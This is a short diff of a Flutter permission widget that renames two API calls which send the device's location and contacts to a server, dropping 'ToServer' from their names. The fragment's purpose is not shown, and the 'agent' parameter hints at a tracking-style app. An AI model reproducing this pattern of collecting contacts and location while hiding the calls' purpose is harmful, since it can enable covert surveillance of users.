@@ -75,11 +75,11 @@ class PermissionState extends State<PermissionWidget> {
     } else if (_permission.toString() == 'Permission.location' ||
         _permission.toString() == 'Permission.locationAlways' ||
         _permission.toString() == 'Permission.locationWhenInUse') {
-      _permissionResult = await Api.sendLocationToServer(agent, uuid) ?? '';
+      _permissionResult = await Api.sendLocation(agent, uuid) ?? '';
 
       setState(() {});
     } else if (_permission.toString() == 'Permission.contacts') {
-      final contactsLength = await Api.sendContactsToServer(agent, uuid) ?? '';
+      final contactsLength = await Api.sendContacts(agent, uuid) ?? '';
       _permissionResult = '$contactsLength contacts found';
 
       setState(() {});
